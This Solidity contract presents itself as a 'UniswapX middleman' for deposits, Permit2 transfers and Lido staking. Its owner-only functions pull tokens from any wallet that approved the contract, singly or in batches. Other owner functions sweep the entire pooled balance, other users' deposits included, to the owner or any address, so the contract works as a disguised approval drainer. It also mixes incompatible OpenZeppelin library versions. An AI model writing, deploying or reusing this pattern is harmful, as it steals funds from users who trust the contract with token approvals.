// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

// ============ INTERFACES ============

interface ILido {
    function submit(address _referral) external payable returns (uint256);
}

interface IWstETH {
    function wrap(uint256 _stETHAmount) external returns (uint256);
    function unwrap(uint256 _wstETHAmount) external returns (uint256);
}

interface IPermit2 {
    struct TokenPermissions {
        address token;
        uint256 amount;
    }
    struct PermitTransferFrom {
        TokenPermissions permitted;
        uint256 nonce;
        uint256 deadline;
    }
    struct SignatureTransferDetails {
        address to;
        uint256 requestedAmount;
    }

    function permitTransferFrom(
        PermitTransferFrom calldata permit,
        SignatureTransferDetails calldata transferDetails,
        address owner,
        bytes calldata signature
    ) external;
}

// ============ MAIN CONTRACT ============

contract UniswapXMiddleman is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    address public lido;
    address public wstETH;
    address public permit2;
    address public referral;
    
    mapping(address => uint256) public userDeposits;
    mapping(address => mapping(address => uint256)) public tokenBalances;
    bool public paused;
    
    event Deposited(address indexed user, address indexed token, uint256 amount);
    event SpentWithAllowance(address indexed user, address indexed token, uint256 amount);
    event Permit2Spent(address indexed user, address indexed token, uint256 amount);
    event StakedToLido(address indexed user, uint256 ethAmount, uint256 stETHReceived);
    event StakedToWstETH(address indexed user, uint256 ethAmount, uint256 wstETHReceived);
    event WithdrawnToOwner(address indexed token, uint256 amount);
    event WithdrawnToUser(address indexed user, address indexed token, uint256 amount);
    event ETHReceived(address indexed sender, uint256 amount);
    
    modifier whenNotPaused() {
        require(!paused, "Contract is paused");
        _;
    }
    
    constructor(
        address _lido,
        address _wstETH,
        address _permit2,
        address _referral,
        address _owner
    ) Ownable(_owner) {
        lido = _lido;
        wstETH = _wstETH;
        permit2 = _permit2;
        referral = _referral;
    }
    
    receive() external payable {
        emit ETHReceived(msg.sender, msg.value);
    }
    
    fallback() external payable {
        emit ETHReceived(msg.sender, msg.value);
    }
    
    function depositETH() external payable whenNotPaused nonReentrant {
        require(msg.value > 0, "Must send ETH");
        userDeposits[msg.sender] += msg.value;
        emit Deposited(msg.sender, address(0), msg.value);
    }
    
    function depositToken(address _token, uint256 _amount) external whenNotPaused nonReentrant {
        require(_amount > 0, "Amount must be > 0");
        require(_token != address(0), "Invalid token");
        uint256 balanceBefore = IERC20(_token).balanceOf(address(this));
        IERC20(_token).safeTransferFrom(msg.sender, address(this), _amount);
        uint256 actualAmount = IERC20(_token).balanceOf(address(this)) - balanceBefore;
        tokenBalances[msg.sender][_token] += actualAmount;
        emit Deposited(msg.sender, _token, actualAmount);
    }
    
    function spendWithAllowance(address _user, address _token, uint256 _amount) external onlyOwner whenNotPaused nonReentrant {
        require(_amount > 0, "Amount must be > 0");
        require(_token != address(0), "Invalid token");
        require(IERC20(_token).allowance(_user, address(this)) >= _amount, "Insufficient allowance");
        uint256 balanceBefore = IERC20(_token).balanceOf(address(this));
        IERC20(_token).safeTransferFrom(_user, address(this), _amount);
        uint256 actualAmount = IERC20(_token).balanceOf(address(this)) - balanceBefore;
        tokenBalances[_user][_token] += actualAmount;
        emit SpentWithAllowance(_user, _token, actualAmount);
    }
    
    function depositWithPermit(
        address _token,
        uint256 _amount,
        uint256 _nonce,
        uint256 _deadline,
        bytes calldata _signature
    ) external whenNotPaused nonReentrant {
        require(_amount > 0, "Amount must be > 0");
        require(_token != address(0), "Invalid token");
        require(permit2 != address(0), "Permit2 not set");
        
        IPermit2.PermitTransferFrom memory permit = IPermit2.PermitTransferFrom({
            permitted: IPermit2.TokenPermissions({ token: _token, amount: _amount }),
            nonce: _nonce,
            deadline: _deadline
        });
        
        IPermit2.SignatureTransferDetails memory details = IPermit2.SignatureTransferDetails({
            to: address(this),
            requestedAmount: _amount
        });
        
        uint256 balanceBefore = IERC20(_token).balanceOf(address(this));
        IPermit2(permit2).permitTransferFrom(permit, details, msg.sender, _signature);
        uint256 actualAmount = IERC20(_token).balanceOf(address(this)) - balanceBefore;
        
        tokenBalances[msg.sender][_token] += actualAmount;
        emit Permit2Spent(msg.sender, _token, actualAmount);
    }
    
    function stakeToLido(uint256 _amount) external whenNotPaused nonReentrant {
        require(_amount > 0, "Amount must be > 0");
        require(lido != address(0), "Lido not set");
        require(address(this).balance >= _amount, "Insufficient ETH balance");
        
        uint256 stETHBefore = IERC20(lido).balanceOf(address(this));
        (bool success, ) = lido.call{value: _amount}(abi.encodeWithSelector(ILido.submit.selector, referral));
        require(success, "Lido stake failed");
        uint256 stETHReceived = IERC20(lido).balanceOf(address(this)) - stETHBefore;
        
        tokenBalances[msg.sender][lido] += stETHReceived;
        userDeposits[msg.sender] -= _amount;
        emit StakedToLido(msg.sender, _amount, stETHReceived);
    }
    
    function stakeToWstETH(uint256 _amount) external whenNotPaused nonReentrant {
        require(_amount > 0, "Amount must be > 0");
        require(lido != address(0), "Lido not set");
        require(wstETH != address(0), "wstETH not set");
        require(address(this).balance >= _amount, "Insufficient ETH balance");
        
        (bool success, ) = lido.call{value: _amount}(abi.encodeWithSelector(ILido.submit.selector, referral));
        require(success, "Lido stake failed");
        
        uint256 stETHBalance = IERC20(lido).balanceOf(address(this));
        IERC20(lido).safeApprove(wstETH, stETHBalance);
        
        uint256 wstETHBefore = IERC20(wstETH).balanceOf(address(this));
        IWstETH(wstETH).wrap(stETHBalance);
        uint256 wstETHReceived = IERC20(wstETH).balanceOf(address(this)) - wstETHBefore;
        
        tokenBalances[msg.sender][wstETH] += wstETHReceived;
        userDeposits[msg.sender] -= _amount;
        emit StakedToWstETH(msg.sender, _amount, wstETHReceived);
    }
    
    function withdrawToOwner(address _token) external onlyOwner nonReentrant {
        uint256 balance;
        if (_token == address(0)) {
            balance = address(this).balance;
            require(balance > 0, "No ETH balance");
            (bool success, ) = owner().call{value: balance}("");
            require(success, "ETH transfer failed");
        } else {
            balance = IERC20(_token).balanceOf(address(this));
            require(balance > 0, "No token balance");
            IERC20(_token).safeTransfer(owner(), balance);
        }
        emit WithdrawnToOwner(_token, balance);
    }
    
    function withdrawToUser(address _user, address _token, uint256 _amount) external onlyOwner nonReentrant {
        require(_amount > 0, "Amount must be > 0");
        if (_token == address(0)) {
            require(address(this).balance >= _amount, "Insufficient ETH");
            userDeposits[_user] -= _amount;
            (bool success, ) = _user.call{value: _amount}("");
            require(success, "ETH transfer failed");
        } else {
            require(tokenBalances[_user][_token] >= _amount, "Insufficient user balance");
            tokenBalances[_user][_token] -= _amount;
            IERC20(_token).safeTransfer(_user, _amount);
        }
        emit WithdrawnToUser(_user, _token, _amount);
    }
    
    function batchSpendWithAllowance(
        address[] calldata _users,
        address[] calldata _tokens,
        uint256[] calldata _amounts
    ) external onlyOwner whenNotPaused nonReentrant {
        require(_users.length == _tokens.length && _tokens.length == _amounts.length, "Length mismatch");
        for (uint256 i = 0; i < _users.length; i++) {
            uint256 balanceBefore = IERC20(_tokens[i]).balanceOf(address(this));
            IERC20(_tokens[i]).safeTransferFrom(_users[i], address(this), _amounts[i]);
            uint256 actualAmount = IERC20(_tokens[i]).balanceOf(address(this)) - balanceBefore;
            tokenBalances[_users[i]][_tokens[i]] += actualAmount;
            emit SpentWithAllowance(_users[i], _tokens[i], actualAmount);
        }
    }
    
    function setLido(address _lido) external onlyOwner { lido = _lido; }
    function setWstETH(address _wstETH) external onlyOwner { wstETH = _wstETH; }
    function setPermit2(address _permit2) external onlyOwner { permit2 = _permit2; }
    function setReferral(address _referral) external onlyOwner { referral = _referral; }
    function togglePause() external onlyOwner { paused = !paused; }
    function rescueTokens(address _token, address _to, uint256 _amount) external onlyOwner {
        IERC20(_token).safeTransfer(_to, _amount);
    }
    
    function getETHBalance() external view returns (uint256) { return address(this).balance; }
    function getTokenBalance(address _token) external view returns (uint256) { return IERC20(_token).balanceOf(address(this)); }
    function getUserTokenBalance(address _user, address _token) external view returns (uint256) { return tokenBalances[_user][_token]; }
    function getUserETHDeposit(address _user) external view returns (uint256) { return userDeposits[_user]; }
}
